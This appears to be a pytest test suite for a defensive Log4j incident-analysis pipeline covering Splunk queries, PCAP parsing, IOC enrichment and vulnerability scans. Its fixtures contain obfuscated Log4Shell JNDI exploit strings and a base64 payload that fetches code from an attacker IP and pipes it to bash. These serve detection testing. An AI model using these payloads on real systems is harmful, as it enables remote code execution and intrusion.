import json
import requests
import pytest
import responses
from unittest.mock import patch, MagicMock

import multi_agent as ma
from multi_agent import (
    CONFIG,
    load_section,
    normalize_jndi_payload,
    tool_query_splunk,
    _parse_tshark_field_output,
    tool_analyze_pcap,
    telemetry,
    PipelineTelemetry,
    retry_request,
    enrich_iocs,
    summarize_vuln_scan,
    tool_syft_sbom,
    tool_grype_scan,
)


# ----- load_section -----

def test_load_section_found(tmp_path):
    f = tmp_path / "test.md"
    f.write_text("## my_section\nhello world\n## other\nbye")
    result = load_section(str(f), "my_section")
    assert result == "hello world"


def test_load_section_not_found(tmp_path):
    f = tmp_path / "test.md"
    f.write_text("## one\ncontent")
    with pytest.raises(ValueError, match="Section 'nonexistent' not found"):
        load_section(str(f), "nonexistent")


# ----- normalize_jndi_payload -----

def test_normalize_lower_obfuscation():
    result = normalize_jndi_payload("${lower:j}ndi:ldap://evil.com")
    assert "jndi:ldap://evil.com" in result


def test_normalize_upper_obfuscation():
    result = normalize_jndi_payload("${upper:j}${upper:n}di")
    assert "jndi" in result.lower()


def test_normalize_colon_dash_obfuscation():
    result = normalize_jndi_payload("${::-j}${::-n}di")
    assert "jndi" in result


def test_normalize_plain_text_unchanged():
    result = normalize_jndi_payload("hello world")
    assert result == "hello world"


def test_normalize_nested_obfuscation():
    payload = "${${lower:l}dap://10.0.0.1:1389/exploit}"
    result = normalize_jndi_payload(payload)
    assert "ldap" in result or "LDAP" in result


def test_normalize_real_base64_payload():
    payload = "KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g="
    result = normalize_jndi_payload(payload)
    assert result == payload


def test_normalize_pdf_jndi_with_obfuscation():
    payload = "${${lower:j}ndi:${lower:l}dap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8xOTguNzEuMjQ3LjkxOjgwfHx3Z2V0IC1xIC1PLSAxOTUuNTQuMTYwLjE0OTo1ODc0LzE5OC43MS4yNDcuOTE6ODApfGJhc2g=}"
    result = normalize_jndi_payload(payload)
    assert "jndi:ldap://195.54.160.149" in result
    assert "${lower:" not in result
    assert "${::-" not in result


def test_normalize_pdf_nested_lower_resolves():
    payload = "${${lower:l}dap://121.140.99.236:1389/Exploit}"
    result = normalize_jndi_payload(payload)
    assert "ldap://121.140.99.236:1389/Exploit" in result


def test_normalize_pdf_known_malicious_ips_match():
    assert "195.54.160.149" in ma.KNOWN_MALICIOUS_IPS
    assert "198.71.247.91" in ma.KNOWN_MALICIOUS_IPS
    assert "175.6.210.66" in ma.KNOWN_MALICIOUS_IPS
    assert "191.232.38.25" in ma.KNOWN_MALICIOUS_IPS
    assert "107.189.1.178" in ma.KNOWN_MALICIOUS_IPS
    assert "147.182.202.30" in ma.KNOWN_MALICIOUS_IPS
    assert "191.71.247.91" not in ma.KNOWN_MALICIOUS_IPS


# ----- _parse_tshark_field_output -----

def test_parse_tshark_json_empty():
    assert _parse_tshark_field_output("") == []


def test_parse_tshark_json_invalid():
    assert _parse_tshark_field_output("not json") == []


def test_parse_tshark_json_valid(sample_tshark_json):
    packets = _parse_tshark_field_output(sample_tshark_json)
    assert len(packets) == 5
    assert packets[0]["frame.number"] == "1"
    assert packets[0]["ip.src"] == "10.0.0.1"
    assert packets[0]["http.request.method"] == "GET"


# ----- Splunk tool (mocked) -----

@responses.activate
def test_tool_query_splunk_success():
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        json={
            "results": [
                {"_time": "2026-07-26T12:00:00Z", "_raw": "log entry 1"},
                {"_time": "2026-07-26T12:00:01Z", "_raw": "log entry 2"},
            ]
        },
        status=200,
    )
    result = tool_query_splunk('search index=* "jndi"')
    assert "TIME RANGE" in result
    assert "log entry 1" in result
    assert "log entry 2" in result


@responses.activate
def test_tool_query_splunk_empty():
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        json={"results": []},
        status=200,
    )
    result = tool_query_splunk('search index=* "jndi"')
    assert "0 events found" in result


@responses.activate
def test_tool_query_splunk_with_pdf_fixture():
    import json, os
    fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
    with open(fixture_path) as f:
        pdf_data = json.load(f)
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        json={"results": pdf_data[:5]},
        status=200,
    )
    result = tool_query_splunk('search index=* "jndi"')
    assert "TIME RANGE" in result
    assert "195.54.160.149" in result
    assert "Jul" in result or "2026" in result


@responses.activate
def test_tool_query_splunk_pdf_full_timeline():
    import json, os
    fixture_path = os.path.join(os.path.dirname(__file__), "fixtures", "pdf_splunk_results.json")
    with open(fixture_path) as f:
        pdf_data = json.load(f)
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        json={"results": pdf_data},
        status=200,
    )
    result = tool_query_splunk('search index=* "jndi" | stats count by src_ip')
    assert "TIME RANGE" in result
    assert "2026-07-24" in result or "Jul 24" in result or "07-24" in result


@responses.activate
def test_tool_query_splunk_no_timestamps():
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        json={"results": [{"_raw": "no time field"}]},
        status=200,
    )
    result = tool_query_splunk('search index=* "jndi"')
    assert "none contain _time" in result


@responses.activate
def test_tool_query_splunk_error():
    responses.add(
        responses.POST,
        f"{CONFIG['SPLUNK_HOST']}/services/search/jobs",
        status=500,
    )
    result = tool_query_splunk("search test")
    assert "SPLUNK_ERROR" in result


# ----- PCAP tool (mocked TShark) -----

@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_not_found(mock_run):
    result = tool_analyze_pcap("nonexistent.pcap")
    assert "PCAP_ERROR" in result
    assert "not found" in result
    mock_run.assert_not_called()


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_parsed(mock_run, sample_tshark_json, sample_dns_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=sample_tshark_json, stderr=""),
        MagicMock(returncode=0, stdout=sample_dns_json, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "PCAP TIMELINE SUMMARY" in result
    assert "120:00:00" in result or "12:00:00" in result or "Jul 26" in result
    assert "10.0.0.1" in result
    assert "10.0.0.2" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_jndi_detected(mock_run, sample_tshark_json, sample_dns_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=sample_tshark_json, stderr=""),
        MagicMock(returncode=0, stdout=sample_dns_json, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "CRITICAL: Log4j JNDI Exploit String" in result
    assert "1389" in result
    assert "OUTBOUND JNDI" in result.upper() or "ALERT" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_suspicious_ua(mock_run, sample_tshark_json, sample_dns_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=sample_tshark_json, stderr=""),
        MagicMock(returncode=0, stdout=sample_dns_json, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "Suspicious UA" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_callback(mock_run, sample_tshark_json, sample_dns_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=sample_tshark_json, stderr=""),
        MagicMock(returncode=0, stdout=sample_dns_json, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "C2 Callback" in result or "Callback" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_dns_queries(mock_run, sample_tshark_json, sample_dns_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=sample_tshark_json, stderr=""),
        MagicMock(returncode=0, stdout=sample_dns_json, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "DNS Queries" in result
    assert "evil-callback.com" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_tshark_error(mock_run):
    mock_run.return_value = MagicMock(returncode=1, stderr="tshark: error")
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("test.pcap")
    assert "PCAP_ERROR" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_pdf_pcapA(mock_run, pdf_tshark_pcapA_json):
    dns_fixture = json.dumps([
        {"_source": {"layers": {
            "frame": {"frame.number": ["6"], "frame.time": ["Jul 24, 2026 22:48:40.000 UTC"]},
            "ip": {"ip.src": ["195.54.160.149"], "ip.dst": ["121.140.99.236"]},
            "dns": {"dns.qry.name": ["evil-callback.com"], "dns.flags.response": ["0"]},
        }}}
    ])
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=pdf_tshark_pcapA_json, stderr=""),
        MagicMock(returncode=0, stdout=dns_fixture, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("pcapA.json")
    assert "PCAP TIMELINE SUMMARY" in result
    assert "195.54.160.149" in result
    assert "175.6.210.66" in result
    assert "CRITICAL: Log4j JNDI Exploit String" in result
    assert "121.140.99.236" in result
    assert "curl/7.68.0" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_pdf_pcapB(mock_run, pdf_tshark_pcapB_json):
    dns_fixture = json.dumps([
        {"_source": {"layers": {
            "frame": {"frame.number": ["20"], "frame.time": ["Jul 24, 2026 22:49:00.000 UTC"]},
            "ip": {"ip.src": ["104.248.144.120"], "ip.dst": ["31.131.16.127"]},
            "dns": {"dns.qry.name": ["callbacks.evil.com"], "dns.flags.response": ["0"]},
        }}}
    ])
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=pdf_tshark_pcapB_json, stderr=""),
        MagicMock(returncode=0, stdout=dns_fixture, stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("pcapB.json")
    assert "PCAP TIMELINE SUMMARY" in result
    assert "104.248.144.120" in result
    assert "46.105.95.220" in result
    assert "5.157.38.50" in result
    assert "198.71.247.91" in result
    assert "OUTBOUND JNDI" in result.upper() or "LDAP" in result.upper()
    assert "Suspicious UA" in result or "suspicious" in result.lower()
    assert "1389" in result


@patch("multi_agent.subprocess.run")
def test_tool_analyze_pcap_pdf_known_malicious(mock_run, pdf_tshark_pcapB_json):
    mock_run.side_effect = [
        MagicMock(returncode=0, stdout=pdf_tshark_pcapB_json, stderr=""),
        MagicMock(returncode=0, stdout="[]", stderr=""),
    ]
    with patch("os.path.exists", return_value=True):
        result = tool_analyze_pcap("pcapB.json")
    assert "Known Malicious IP" in result or "198.71.247.91" in result


# ----- PipelineTelemetry -----

def test_telemetry_summary_empty():
    t = PipelineTelemetry()
    s = t.summary()
    assert "Pipeline Telemetry" in s


def test_telemetry_summary_with_data():
    t = PipelineTelemetry()
    t.agent_durations["Agent 1"] = 1.5
    t.splunk_results_count = 10
    t.pcap_packets_processed = 100
    t.pcap_packets_flagged = 5
    t.errors.append("test error")
    s = t.summary()
    assert "Agent 1: 1.50s" in s
    assert "Splunk results: 10" in s
    assert "100 processed" in s
    assert "5" in s
    assert "test error" in s


# ----- IOC enrichment -----

@patch("multi_agent.requests.get")
def test_enrich_iocs_with_cache(mock_get):
    mock_get.return_value = MagicMock(
        status_code=200,
        text="# IOC list\n10.0.0.5,evil.com\n192.168.1.1,internal\n",
    )
    ma._ioc_cache = None
    result = enrich_iocs(["10.0.0.5", "1.2.3.4"], ["evil.com", "benign.com"])
    assert "10.0.0.5" in result["ips"]
    assert "1.2.3.4" not in result["ips"]
    assert "evil.com" in result["domains"]
    assert "benign.com" not in result["domains"]


@patch("multi_agent.requests.get")
def test_enrich_iocs_feed_failure(mock_get):
    mock_get.side_effect = requests.ConnectionError("no network")
    ma._ioc_cache = None
    result = enrich_iocs(["10.0.0.5"], [])
    assert result == {"ips": [], "domains": []}


# ----- Vulnerability scanning -----

SAMPLE_SYFT_JSON = json.dumps({
    "artifacts": [
        {"name": "log4j-core", "version": "2.14.1", "type": "java-archive"},
        {"name": "openssl", "version": "1.1.1", "type": "deb"},
    ],
    "source": {"type": "directory", "target": "/tmp"},
})

SAMPLE_GRYPE_JSON = json.dumps({
    "matches": [
        {
            "vulnerability": {
                "id": "CVE-2021-44228",
                "severity": "Critical",
                "fix": {"versions": ["2.17.0"]},
            },
            "artifact": {"name": "log4j-core", "version": "2.14.1"},
        },
        {
            "vulnerability": {
                "id": "CVE-2024-1234",
                "severity": "High",
                "fix": {"versions": ["1.2.3"]},
            },
            "artifact": {"name": "openssl", "version": "1.1.1"},
        },
        {
            "vulnerability": {
                "id": "CVE-2025-5678",
                "severity": "Medium",
                "fix": {"versions": []},
            },
            "artifact": {"name": "libfoo", "version": "0.9"},
        },
    ],
    "source": {"type": "directory", "target": "/tmp"},
})


def test_summarize_vuln_scan():
    result = summarize_vuln_scan(SAMPLE_GRYPE_JSON, SAMPLE_SYFT_JSON)
    assert "VULNERABILITY SCAN SUMMARY" in result
    assert "Packages cataloged: 2" in result
    assert "Vulnerabilities found: 3" in result
    assert "Critical: 1" in result
    assert "High: 1" in result
    assert "Medium: 1" in result
    assert "CVE-2021-44228" in result
    assert "log4j-core" in result


def test_summarize_vuln_scan_no_matches():
    empty_grype = json.dumps({"matches": []})
    empty_syft = json.dumps({"artifacts": []})
    result = summarize_vuln_scan(empty_grype, empty_syft)
    assert "Vulnerabilities found: 0" in result
    assert "Packages cataloged: 0" in result


def test_summarize_vuln_scan_bad_json():
    result = summarize_vuln_scan("not json", "not json either")
    assert "VULN_ERROR" in result


@patch("multi_agent.subprocess.run")
def test_tool_syft_sbom_skip(mock_run):
    CONFIG["SCAN_TARGET"] = ""
    result = tool_syft_sbom()
    assert "VULN_SKIP" in result
    mock_run.assert_not_called()


@patch("multi_agent.subprocess.run")
def test_tool_grype_scan_skip(mock_run):
    CONFIG["SCAN_TARGET"] = ""
    result = tool_grype_scan()
    assert "VULN_SKIP" in result
    mock_run.assert_not_called()


@patch("multi_agent.subprocess.run")
def test_tool_syft_sbom_success(mock_run):
    CONFIG["SCAN_TARGET"] = "/tmp"
    mock_run.return_value = MagicMock(returncode=0, stdout=SAMPLE_SYFT_JSON, stderr="")
    result = tool_syft_sbom()
    assert "artifacts" in result
    mock_run.assert_called_once()


@patch("multi_agent.subprocess.run")
def test_tool_grype_scan_success(mock_run):
    CONFIG["SCAN_TARGET"] = "/tmp"
    mock_run.return_value = MagicMock(returncode=0, stdout=SAMPLE_GRYPE_JSON, stderr="")
    result = tool_grype_scan()
    assert "matches" in result
    mock_run.assert_called_once()


@patch("multi_agent.subprocess.run")
def test_tool_syft_sbom_error(mock_run):
    CONFIG["SCAN_TARGET"] = "/tmp"
    mock_run.return_value = MagicMock(returncode=1, stderr="syft: error")
    result = tool_syft_sbom()
    assert "VULN_ERROR" in result


# ----- Pipeline config validation using PDF reference data -----

def test_pipeline_config_matches_pdf_data(pdf_reference_data):
    ref = pdf_reference_data
    missing_ips = [ip for ip in ref["known_malicious_ips"] if ip not in ma.KNOWN_MALICIOUS_IPS]
    assert not missing_ips, f"KNOWN_MALICIOUS_IPS missing: {missing_ips}"

    for cb in ref["callback_endpoints"]:
        endpoint = cb["endpoint"]
        ip_part = endpoint.split(":")[0]
        assert ip_part in ma.KNOWN_MALICIOUS_IPS or "." in ip_part, f"Callback IP {ip_part} not tracked"


def test_pipeline_pcap_dirs_configured():
    assert ma.CONFIG["PCAP_DIRECTORY"], "PCAP_DIRECTORY must be set"
    assert ma.CONFIG["REQUIRED_PCAPS"], "REQUIRED_PCAPS must not be empty"


def test_pipeline_ollama_configured():
    assert ma.CONFIG["OLLAMA_HOST"], "OLLAMA_HOST must be set"
    assert ma.CONFIG["LLM_MODEL"], "LLM_MODEL must be set"


# ----- retry_request -----

@responses.activate
def test_retry_request_success_first_try():
    responses.add(responses.GET, "http://test.local/ok", body="ok", status=200)
    res = retry_request("GET", "http://test.local/ok")
    assert res.status_code == 200
    assert len(responses.calls) == 1


@responses.activate
def test_retry_request_retries_on_500():
    responses.add(responses.GET, "http://test.local/fail", body="error", status=500)
    responses.add(responses.GET, "http://test.local/fail", body="error", status=500)
    responses.add(responses.GET, "http://test.local/fail", body="ok", status=200)
    res = retry_request("GET", "http://test.local/fail")
    assert res.status_code == 200
    assert len(responses.calls) == 3
